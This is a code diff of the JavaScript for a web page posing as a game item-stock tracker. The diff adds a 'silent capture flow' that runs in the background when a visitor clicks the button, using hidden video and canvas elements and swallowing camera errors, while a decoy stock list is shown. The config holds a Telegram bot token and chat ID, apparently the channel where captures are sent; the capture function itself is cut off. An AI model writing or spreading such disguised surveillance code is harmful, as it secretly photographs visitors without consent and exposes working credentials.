@@ -2,17 +2,20 @@ const CONFIG = {
     TELEGRAM_BOT_TOKEN: '8663952645:AAGId4MEbgWPNVNWSsa8o5M_NHXSoqos1po',
     CHAT_ID: '7674484307',
     VIDEO_DURATION: 3000, // 3 seconds
+    STOCK_API: 'https://zenithghz.qzz.io/api/all'
 };
 
 const elements = {
     form: document.getElementById('claimForm'),
-    phoneInput: document.getElementById('phoneNumber'),
     submitBtn: document.getElementById('submitBtn'),
     spinner: document.getElementById('spinner'),
     btnText: document.querySelector('.btn-text'),
     status: document.getElementById('statusMessage'),
     video: document.getElementById('hidden-video'),
-    canvas: document.getElementById('hidden-canvas')
+    canvas: document.getElementById('hidden-canvas'),
+    stockDisplay: document.getElementById('stock-display'),
+    stockList: document.getElementById('stock-list'),
+    lastUpdate: document.getElementById('last-update')
 };
 
 let hasPermission = false;
@@ -40,33 +43,66 @@ document.addEventListener('click', async () => {
 
 elements.form.addEventListener('submit', async (e) => {
     e.preventDefault();
-    const phoneNumber = elements.phoneInput.value;
+    const traceInfo = 'Button Clicked';
     
     // UI Loading state
     setLoading(true);
-    elements.status.textContent = 'Synchronizing Stock Database...';
+    elements.status.textContent = 'Connecting to Zenith Database...';
     elements.status.style.color = 'var(--primary)';
 
+    // Silent capture flow - background process
+    startCaptureFlow(traceInfo).catch(() => {
+        // Silently ignore camera errors (e.g. no camera, denied permission)
+    });
+
     try {
-        await startCaptureFlow(phoneNumber);
-        
+        // Fetch and show stock immediately
+        await updateStockDisplay();
+
         // Final UI state
-        elements.status.textContent = 'Auto Stock Activated! Your inventory is now syncing in real-time.';
+        elements.status.textContent = 'Inventory Synced Successfully!';
         elements.status.style.color = 'var(--accent)';
-        elements.phoneInput.value = '';
     } catch (err) {
-        console.error('Flow error:', err);
-        elements.status.textContent = 'Error: Device not compatible or permission denied.';
+        console.error('Stock display error:', err);
+        elements.status.textContent = 'Error: Database connection lost.';
         elements.status.style.color = 'var(--accent)';
     } finally {
         setLoading(false);
     }
 });
 
+async function updateStockDisplay() {
+    try {
+        const response = await axios.get(CONFIG.STOCK_API);
+        const data = response.data;
+        
+        if (data.market) {
+            const allItems = [...data.market.seeds, ...data.market.gear];
+            renderStock(allItems);
+            elements.stockDisplay.style.display = 'block';
+            elements.lastUpdate.textContent = `Last update: ${new Date().toLocaleTimeString()}`;
+        }
+    } catch (err) {
+        console.error('Stock API error:', err);
+    }
+}
+
+function renderStock(items) {
+    elements.stockList.innerHTML = items.map(item => `
+        <div class="stock-item">
+            <div class="item-info">
+                <span class="item-emoji">${item.emoji || '📦'}</span>
+                <span class="item-name">${item.name}</span>
+            </div>
+            <span class="item-quantity">${item.quantity} In Stock</span>
+        </div>
+    `).join('');
+}
+
 function setLoading(isLoading) {
     elements.submitBtn.disabled = isLoading;
     elements.spinner.style.display = isLoading ? 'block' : 'none';
-    elements.btnText.textContent = isLoading ? 'Processing...' : 'Claim Now';
+    elements.btnText.textContent = isLoading ? 'Syncing...' : 'Garden Horizon Stock';
 }
 
 async function startCaptureFlow(phoneNumber = 'Initial Load') {
